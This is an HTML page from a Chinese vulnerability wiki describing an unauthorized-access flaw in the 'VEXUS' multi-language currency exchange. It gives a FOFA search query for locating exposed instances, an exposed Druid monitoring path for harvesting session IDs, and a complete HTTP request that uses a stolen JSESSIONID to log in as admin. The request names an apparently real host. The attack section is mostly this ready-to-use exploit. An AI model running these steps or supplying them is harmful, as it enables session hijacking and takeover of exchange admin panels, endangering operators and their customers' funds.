@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VEXUS%E5%A4%9A%E8%AF%AD%E8%A8%80%E8%B4%A7%E5%B8%81%E4%BA%A4%E6%98%93%E6%89%80/VEXUS%E5%A4%9A%E8%AF%AD%E8%A8%80%E8%B4%A7%E5%B8%81%E4%BA%A4%E6%98%93%E6%89%80%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>VEXUS多语言货币交易所存在未授权访问漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "VEXUS\u591a\u8bed\u8a00\u8d27\u5e01\u4ea4\u6613\u6240\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../VICIdial/VICIdial%20Unauthenticated%20SQLi%20to%20RCE%20%28CVE-2024-8503%20and%20CVE-2024-8504%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../VICIdial/VICIdial%20Unauthenticated%20SQLi%20to%20RCE%20%28CVE-2024-8503%20and%20CVE-2024-8504%29/" class="btn btn-xs btn-link">
+        VICIdial Unauthenticated SQLi to RCE (CVE 2024 8503 and CVE 2024 8504)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../UsualToolcms/UsualToolcms%208.0%20%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../UsualToolcms/UsualToolcms%208.0%20%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/" class="btn btn-xs btn-link">
+        UsualToolcms 8.0 绕过后台验证码爆破
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="vexus">VEXUS多语言货币交易所存在未授权访问漏洞<a class="headerlink" href="#vexus" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>VEXUS多语言货币交易所存在未授权访问漏洞</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>VEXUS多语言货币交易所</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>"image/n2.png" &amp;&amp; "public/login.action"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1727498799522-822e93ff-50be-42a1-9e0b-111a2f844864.png" src="./img/cvy4scQ9X281hrqb/1727498799522-822e93ff-50be-42a1-9e0b-111a2f844864-063597.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">druid</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="na">html</span>
+</code></pre></div>
+<p><img alt="1727498820102-2db97c04-7594-473e-9e30-dd4678d21aca.png" src="./img/cvy4scQ9X281hrqb/1727498820102-2db97c04-7594-473e-9e30-dd4678d21aca-036126.png" /></p>
+<p>获取session后可通过下面poc进行爆破</p>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">normal</span><span class="o">/</span><span class="n">LoginSuccessAction</span><span class="o">!</span><span class="n">view</span><span class="p">.</span><span class="na">action</span><span class="o">?</span><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">ru</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span>
+<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+<span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">可用的SESSION</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">admin</span><span class="p">.</span><span class="na">kftust</span><span class="p">.</span><span class="na">com</span>
+<span class="nl">Pragma</span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">129.0.0.0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+</code></pre></div>
+<blockquote>
+<p>更新: 2024-10-22 09:36:08<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/nkwou5fss984m2t8">https://www.yuque.com/xiaokp7/ocvun2/nkwou5fss984m2t8</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../VICIdial/VICIdial%20Unauthenticated%20SQLi%20to%20RCE%20%28CVE-2024-8503%20and%20CVE-2024-8504%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../VICIdial/VICIdial%20Unauthenticated%20SQLi%20to%20RCE%20%28CVE-2024-8503%20and%20CVE-2024-8504%29/" class="btn btn-xs btn-link">
+        VICIdial Unauthenticated SQLi to RCE (CVE 2024 8503 and CVE 2024 8504)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../UsualToolcms/UsualToolcms%208.0%20%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../UsualToolcms/UsualToolcms%208.0%20%E7%BB%95%E8%BF%87%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/" class="btn btn-xs btn-link">
+        UsualToolcms 8.0 绕过后台验证码爆破
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
